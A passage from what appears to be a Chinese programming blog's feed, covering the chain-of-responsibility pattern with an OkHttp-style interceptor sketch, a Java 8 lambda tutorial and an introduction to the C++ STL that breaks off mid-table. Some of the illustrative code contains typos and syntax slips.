&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">chain</span> <span class="params">(Chain chain)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//这里是真实的发送网络请求</span></span><br><span class="line">    <span class="keyword">return</span> 网络请示的响应;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 添加拦截器,后加的放最前面</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> intercper 拦截器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addIntercepter</span><span class="params">(Intercepter intercper)</span></span>&#123;</span><br><span class="line">    mIntercepters.add(<span class="number">0</span>, intercper);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* OkHttp请求的入口</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> request 请示</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> callback 回调</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Request request ,Callback callback)</span></span>&#123;</span><br><span class="line">    mCallback=callback;</span><br><span class="line">    mIndex=<span class="number">0</span>;</span><br><span class="line">    mRequest=request;</span><br><span class="line">    <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            Response response=mChain.process(mRequest);</span><br><span class="line">            mCallback.onResponse(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 定义的一个类用与递归的方式完成责任链发送请求获取响应</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Chain</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Request <span class="title">getRequest</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mRequest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 顺序获取拦截器,传递chain对象给拦截器,获取响应</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> 请求的响应</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Response <span class="title">getResponse</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    Intercepter intercepter = mIntercepters.get(mIndex);</span><br><span class="line">    mIndex++;</span><br><span class="line">    <span class="keyword">return</span> intercepter.chain(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 如果责任链没走完,则顺序从责任链中获取拦截器,处理请求</span></span><br><span class="line"><span class="comment">* 否则由真正的负责网络请求的拦截器处理请求</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> request 请求</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> 响应</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">Response <span class="title">process</span><span class="params">(Request request)</span></span>&#123;</span><br><span class="line">    mRequest=request;</span><br><span class="line">    <span class="keyword">if</span> (mIndex&gt;=mIntercepters.size())&#123;</span><br><span class="line">        <span class="keyword">return</span> Okhttp.<span class="keyword">this</span>.mNetIntercepter.chain(<span class="keyword">this</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> getResponse();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>不得不说程序猿写文章真是容易骗字数.我已经极力在简化了.代码还是差不多上百行.</p><p>应该写得够简单吧.重点也就几个</p><ol>  <li>内部有个处理真实网络请求的<code>Intercepter</code>,做为最后的接盘侠.</li>  <li>返回响应的是<code>intercepter.chain(this)</code>,如果这个拦截器调用了<code>chain</code>的<code>process()</code>方法就形成递归,否则就是终断了请求的传递</li>  <li>整个责任链的传递都是同步的.整体在子线程运行,最后通过回调返回响应.</li></ol><p>还有一个很经典的实现就是Android的事件分发机制.这里我就不贴代码骗字数了.网上随便一找一堆.</p><h1>责任链模式的用途</h1><p>当业务逻辑需要形成一个事件处理流时,就可以考虑使用责任链模式.通过接口来规范中间环节的行为,专注与事件流的传递.可以随意扩展及调整中间环节.</p><p>我在实际业务中的有一个场景中使用了责任链模式.(当时使用的时候其实并不清楚)</p><ol>  <li>在一个列表中可以弹出一个筛选菜单,菜单项是不定的.某些项选择后可以增加更多的选项条目</li>  <li>选项条目类型不同.有单选,多选,输入等.</li>  <li>点击完成时才把所有筛选条目形成对应的网络请求参数</li></ol><p>实际处理起来很简易.定义了两个类</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ParamsSetAble</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setParams</span><span class="params">(NetParams params)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NetParams</span></span>&#123;&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>每个条目实现<code>ParamsSetAble</code>接口用与设置参数.</p><p><code>NetParams</code>类用与收集参数,最后转换成网络请求所用的格式</p><p>当点击完成时,遍历所有的条目,传递<code>NetParams</code>对象.最后把这个对象传递给网络请求的类.</p><p>在传递时进行可以进行参数检查,错误时可以中断传递,提示错误.我这里是通过手动抛异常来中断的.在外部统一<code>catch</code>处理.如果用<code>Rxjava</code>可以不用<code>catch</code>,在<code>onError</code>里统一管理.如<code>Observer.error(new 自定义异常(中断提示信息))</code></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7c56e6ba/">http://home.meng.uno/articles/7c56e6ba/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      责任链模式
责任链模式是对一个事件的处理方法,所有能对事件进行处理的对象按顺序形成一个链表.事件经过链表中每个处理对象轮流处理.如果有返回值.则返回也是顺着这条链表反向返回.这个链表是先进后出模式.

 * 在现实中的责任链模型之一就是网络连接.对与程序猿而言,七层或五层的网络连接模型是肯定知道的.

当一个网络请求发出时,需要经过应用层-&gt;传输层-&gt;网络层-&gt;连接层-&gt;物理层

收到响应后正好反过来,物理层-&gt;连接层-&gt;网络层-&gt;传输层-&gt;应用层

在请求经过各层时,由每层轮流处理.每层都可以对请求或响应进行处理.并可以中断链接,以自身为终点返回响应

 * 另一个现实模型就是Web服务器的
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="设计模式" scheme="http://home.meng.uno/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="OkHttp" scheme="http://home.meng.uno/tags/OkHttp/"/>
    
  </entry>
  
  <entry>
    <title>Lambda表达式</title>
    <link href="http://home.meng.uno/articles/bbcf5ff7/"/>
    <id>http://home.meng.uno/articles/bbcf5ff7/</id>
    <published>2017-02-25T08:20:58.000Z</published>
    <updated>2020-12-02T01:52:37.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>Java8已经更新了好久了。变化很大，其中最广为人知的就是<code>Lambda</code>表达式。</p></blockquote><h1>Lambda表示式</h1><p><code>Lambda</code>的基本格式为<code>()-&gt;内容</code>,以箭头为分隔，左边为参数区，右边为代码区。</p><p>可以把它看成是一个临时定义的方法，没有方法名，默认为<code>public</code>,根据代码区里的有没有<code>return</code>来决定返回值．如果没有<code>return</code>则是<code>void</code>。</p><ol>  <li>单行代码可以省略return</li>  <li>多行代码使用<code>{}</code>来包裹.</li>  <li>代码内可以引用外部局部变量，实际上是隐式的把变量变成<code>final</code></li></ol><p>网上用得最多的例子就是<code>(x,y)-&gt;x+y;</code>,很蛋疼的例子，当初看<code>Junit</code>单元测试时也是这样的例子。</p><p>来个实际点的例子吧：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">(String text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> text==<span class="keyword">null</span>||<span class="string">""</span>.eqauls(text)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用Lambda是</span></span><br><span class="line">(text)-&gt;<span class="keyword">return</span> text==<span class="keyword">null</span>||<span class="string">""</span>.eqauls(text);</span><br></pre>      </td>    </tr>  </table></figure><p>看到这里估计很多人会觉得更蛋疼了。明明<code>Lambda</code>使用是的匿名内部类的简写，为什么要拿方法来做比较，另外明明有方法可以调用，何必要用<code>Lambda</code>。</p><h1>Lambda的起源</h1><p>曾经无数次的羡慕<code>js</code>有闭包，可以把方法当做参数来传递。在项目中有很多类都存在着很类似的方法：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getIds</span><span class="params">(List&lt;T&gt; list)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(list==<span class="keyword">null</span>||list.isEmpty)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(T t:list)&#123;</span><br><span class="line">        String id=doSomething(t)</span><br><span class="line">        builder.append(<span class="string">","</span>).append(id);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> builder.deleteCharAt(<span class="number">0</span>).toString();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>想抽取一下,奈何每个类里<code>T</code>不同，<code>doSomething</code>的实现也不同．<code>T</code>可以用泛型，<code>doSomething（T t）</code>这个方法怎么传呢？</p><p>面向接口吧。我们可以定义一个接口来干这个事：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GetId</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getId</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>上面的方法就可以抽到工具类中了：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">String <span class="title">getIds</span><span class="params">(List&lt;T&gt; list,GetId&lt;T&gt; interf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(list==<span class="keyword">null</span>||list.isEmpty)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(T t:list)&#123;</span><br><span class="line">            String id=interf.getId(t);</span><br><span class="line">            builder.append(<span class="string">","</span>).append(id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> builder.deleteCharAt(<span class="number">0</span>).toString();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>说来说去好像不关<code>Lambda</code>什么的事呀．实际上上面的例子就是Lambda的起源。</p><p>随着函数式编程广为程序员喜爱，Java也在考虑加入函数式编程．但有两个问题，一　做为一个强类型语言，类型转换有点蛋疼，二　不能把方法当成参数(有返回值的还好，<code>void</code>方法当参数是相当的无语的)。</p><p><code>Java</code>考虑了半天，使用了上面的例子的逻辑来处理，用接口来包装方法，把接口当参数来代替。</p><p>上面的例子中。在类中调用如下：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String ids=Utils.getIds(List&lt;XXX&gt; list,<span class="keyword">new</span> GetId&lt;XXX&gt;()&#123;</span><br><span class="line">    getId(XXX x)&#123;</span><br><span class="line">        <span class="keyword">return</span> ooxx(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><p>这是一个参数，如果是多个参数那不要吓死人：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String ids=Utils.getIds(List&lt;XXX&gt; list,</span><br><span class="line">    <span class="keyword">new</span> GetId&lt;XXX&gt;()&#123;</span><br><span class="line">        getId(XXX x)&#123;</span><br><span class="line">            <span class="keyword">return</span> ooxx(x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="keyword">new</span> GetId&lt;XXX&gt;()&#123;getId(XXX x)&#123;</span><br><span class="line">        <span class="keyword">return</span> xxoo(x);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="keyword">new</span> GetId&lt;XXX&gt;()&#123;getId(XXX x)&#123;</span><br><span class="line">        <span class="keyword">return</span> oxox(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre>      </td>    </tr>  </table></figure><p>所以<code>Lambda</code>第一个作用就体现出来了简化书写，好写好看。如：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String ids=Utils.getIds(List&lt;XXX&gt; list,(x)-&gt;ooxx(x));</span><br></pre>      </td>    </tr>  </table></figure><p>这里有点奇怪<code>x</code>是什么呢？其实完整的应该是：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String ids=Utils.getIds(List&lt;XXX&gt; list,(XXX x)-&gt;ooxx(x));</span><br></pre>      </td>    </tr>  </table></figure><p>这里就体现了<code>lambda</code>的牛逼之处<strong>类型推导</strong>(准确来说是Java8的特性),编译时推导参数类型和返回类型。</p><p>最上面那个坑爹的例子估计很多人都会像我当初一样蒙Ｂ。<code>(x,y)-&gt;x+y;</code>,这ｘ和ｙ是什么的东西？</p><p>实际上这个例子应该是<code>(int x,int y)-&gt;return x+y;</code>，这样看就清楚多了，传两个int,返回其和。</p><p>再给个实际点的例子吧：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line">String[] strings=&#123;<span class="string">"xx"</span>,<span class="string">"oo"</span>,<span class="string">"xxoo"</span>&#125;;</span><br><span class="line"><span class="comment">//传统的排序是这样的</span></span><br><span class="line">Arrays.sort(strings,<span class="keyword">new</span> Comparetor&lt;String&gt;()&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(String s1,String s2)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> s1.length-s2.length;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//使用lambda是这样的</span></span><br><span class="line">Arrays.sort(strings,(String s1,String s2)-&gt;<span class="keyword">return</span> s1.length-s2.length);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">Arrays.sort(strings,(s1,s2)-&gt;s1.length-s2.length);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">Arrays.sort(strings,(s1,s2)-&gt;&#123;</span><br><span class="line">    <span class="keyword">int</span> x= s1.length;</span><br><span class="line">    <span class="keyword">int</span> y=s2.length;</span><br><span class="line">    <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><h1>Lambda的实现</h1><p><code>lambda</code>的原理就是以把接口当参数传递的方式来形成闭包．所以这个接口只能定义一个方法，这种接口叫<code>函数接口</code>.这种接口可以隐式转为<code>lambda</code>。</p><p>为了防止该接口的单方法性被破坏，<code>Java8</code>定义了一个注解<code>FunctionInterface</code>，Java库中所有这种接口都已经添加了这个注解。如：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="meta">@FunctionInterface</span></span><br><span class="line"><span class="keyword">public</span> Interface Runable&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>当然，自己也可以定义函数接口，很简单，只要是单方法都可以。最好是加上注解，防止自己或别人去添加新的方法。</p><p>另外Java8中提供了很多常用的接口，免得自己去创建。这些接口放在<code>java.utils.function</code>包里。</p><p>默认的接口可接收和返回的基本数据只有<code>int</code>,<code>long</code>,<code>double</code>三种，<code>String</code>视为对象。</p><ol>  <li>Custmer一家，提供了<code>void</code>类的接口，可以接收单个或两个的基本数据类型或对象的参数(无参的有现成的<code>Runable</code>)。如：</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Custmer</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">(T t)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">interface BiConsumer&lt;T,U&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">apply</span><span class="params">(T t,U u)</span></span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>另外还支持对象+基本数据类型的参数。</p><ol start="2">  <li>    <p>Predicate一家，提供了可接收1-2个基本数据类型或对象的参数，返回<code>boolean</code>的接口(无参的是<code>booleanSupplier</code>接口)。</p>  </li>  <li>    <p>Function,Oprator,Supplier一家，提供了接收0-2个参数，返回基本数据类型或对象的接口。</p>    <ul>      <li>Function一家可接收1-2个参数，返回的是对象</li>      <li>Supplier一家不接收参数，返回基本数据类型和对象</li>      <li>Operator一家接收1-2个参数，返回同类型的数据。<code>unary</code>前缀的是接收一个参数，<code>binary</code>前缀的是接收两个参数。那个坑爹的<code>(x,y)-&gt;x+y</code>的例子就是由<code>IntBinaryOperator</code>接口来实现的。</li>    </ul>  </li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IntBinaryOperator</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">applyAsInt</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>默认提供的接口，如果是两个基本数据类型的参数，则参数的类型都必须是相同的.也就是说两个以内的参数基本上不用自己定义函数接口了。上面的例子就可以这样写：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">String <span class="title">getIds</span><span class="params">(List&lt;T&gt; list,Function&lt;T,String&gt; interf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(list==<span class="keyword">null</span>||list.isEmpty)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span>(T t:list)&#123;</span><br><span class="line">            String id=interf.apply(t);</span><br><span class="line">            builder.append(<span class="string">","</span>).append(id);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> builder.deleteCharAt(<span class="number">0</span>).toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用时如下　</span></span><br><span class="line">Utils.getIds(list,t-&gt;ooxx(t);)</span><br></pre>      </td>    </tr>  </table></figure><h1>函数式编程</h1><p>函数式编程需要可以把函数当成参数，在<code>Java</code>中所有的东西都是需要有类型的，只有函数自身是没有的。<code>Lambda</code>以间接的方式提供了函数的类型，及类型的推导，为函数式编程清扫了最大的障碍。再配合新提供的<code>Stream</code>，在<code>Java</code>中终与可以愉快的的使用函数式编程了。</p><p>然而，没有Lambda,没有Java8,我用<code>Rxjava</code>一样可以愉快的函数式编程。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/bbcf5ff7/">http://home.meng.uno/articles/bbcf5ff7/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Java8已经更新了好久了。变化很大，其中最广为人知的就是Lambda表达式。

Lambda表示式
Lambda的基本格式为()-&gt;内容,以箭头为分隔，左边为参数区，右边为代码区。

可以把它看成是一个临时定义的方法，没有方法名，默认为public,根据代码区里的有没有return来决定返回值．如果没有return则是void。

 1. 单行代码可以省略return
 2. 多行代码使用{}来包裹.
 3. 代码内可以引用外部局部变量，实际上是隐式的把变量变成final

网上用得最多的例子就是(x,y)-&gt;x+y;,很蛋疼的例子，当初看Junit单元测试时也是这样的例子。

来个实际点的
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="language" scheme="http://home.meng.uno/tags/language/"/>
    
  </entry>
  
  <entry>
    <title>STL简介</title>
    <link href="http://home.meng.uno/articles/5ae627d/"/>
    <id>http://home.meng.uno/articles/5ae627d/</id>
    <published>2017-02-12T12:18:15.000Z</published>
    <updated>2020-12-02T02:05:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1>STL简介</h1><p>STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。它是由Alexander Stepanov、Meng Lee和David R Musser在惠普实验室工作时所开发出来的。现在虽说它主要出现在C<ins>中，但在被引入C</ins>之前该技术就已经存在了很长的一段时间。</p><p>STL的代码从广义上讲分为三类：algorithm（算法），container（容器）和 iterator（迭代器），几乎所有的代码都采用了模板类和模版函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文件：  <algorithm>、    <deque>、      <functional>、        <iterator>、          <vector>、            <list>、<map>、<memory>、<numeric>、<queue>、<set>、<stack>和<utility>。</utility></stack></set></queue></numeric></memory></map></list></vector></iterator></functional></deque></algorithm></p><h1>算法</h1><p>大家都能取得的一个共识是函数库对数据类型的选择对其可重用性起着至关重要的作用。</p><p>举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使用整型作为它的参数类性要高。而C++通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL就利用了这一点提供了相当多的有用算法。它是在一个有效的框架中完成这些算法的——你可以将所有的类型划分为少数的几类，然后就可以在模版的参数中使用一种类型替换掉同一种类中的其他类型。</p><p>STL提供了大约100个实现算法的模版函数，比如算法for_each将为指定序列中的每一个元素调用指定的函数，stable_sort以你所指定的规则对序列进行稳定性排序等等。这样一来，只要我们熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能并大大地提升效率。</p><p>算法部分主要由头文件<algorithm>，<numeric>和<functional>组成。<algorithm>是所有STL头文件中最大的一个（尽管它很好理解），它是由一大堆模版函数组成的，可以认为每个函数在很大程度上都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、移除、反转、排序、合并等等。<numeric>体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。<functional>中则定义了一些模板类，用以声明函数对象。</functional></numeric></algorithm></functional></numeric></algorithm></p><h1>容器</h1><p>在实际的开发过程中，数据结构本身的重要性不会逊于操作于数据结构的算法的重要性，当程序中存在着对时间要求很高的部分时，数据结构的选择就显得更加重要。</p><p>经典的数据结构数量有限，但是我们常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在细节上有所出入。STL容器就为我们提供了这样的方便，它允许我们重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模版类，STL容器对最常用的数据结构提供了支持，这些模板的参数允许我们指定容器中元素的数据类型，可以将我们许多重复而乏味的工作简化。</p><p>容器部分主要由头文件<vector>, <list>, <deque>, <set>, <map>, <stack> 和 <queue>组成。</queue></stack></map></set></deque></list></vector></p><p>对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结一下它们和相应头文件的对应关系。</p><table><thead><tr><th style="text-align:right">数据结构</th><th style="text-align:center">描述</th><th style="text-align:left">实现头文件</th></tr></thead><tbody><tr><td style="text-align:right">向量(vector)</td><td style="text-align:center">连续存储的元素</td><td style="text-align:left"><vector></vector></td></tr><tr><td style="text-align:right">列表(list)</td><td style="text-align:center">由节点组成的双向链表，每个结点包含着一个元素</td><td style="text-align:left"><list></list></td></tr><tr><td style="text-align:right">双队列(deque)</td><td style="text-align:center">连续存储的指向不同元素的指针所组成的数组</td><td style="text-align:left"><deque></deque></td></tr><tr><td style="text-align:right">集合(set)</td><td style="text-align:center">由节点组成的红黑树，每个节点都包含着一个元素，节点之间以某种作用于元素对的谓词排列，没有两个不同的元素能够拥有相同的次序</td><td style="text-align:left"><set></set></td></tr><tr><td style="text-align:right">多重集合(multiset)</td><td style="text-align:center">允许存在两个次序相等的元素的集合</td><td style="text-align:left"><set></set></td></tr><tr><td style="text-align:right">栈(stack)</td><td style="text-align:center">后进先出的值的排列</td><td style="text-align:left"><stack></stack></td></tr><tr><td style="text-align:right">队列(queue)</td><td style="text-align:center">先进先出的执的排列</td><td style="text-align:left"><queue></queue></td></tr><tr><td style="text-align:right">优先队列(priority_queue)</td><td style="text-align:center">元素的次序是由作用于所存储的值对上的某种谓词决定的的一种队列</td><td style="text-align:left"><queue></queue></td></tr><tr><td style="text-align:right">映射(map)</td><td style="text-align:center">由{键，值}对组成的集合，以某种作用于键对上的谓词排列</td><td style="text-align:left"><map></map></td></tr><tr><td style="text-align:right">多重映射(multimap)</td><td style="text-align:center">允许键对有相等的次序的映射</td><td 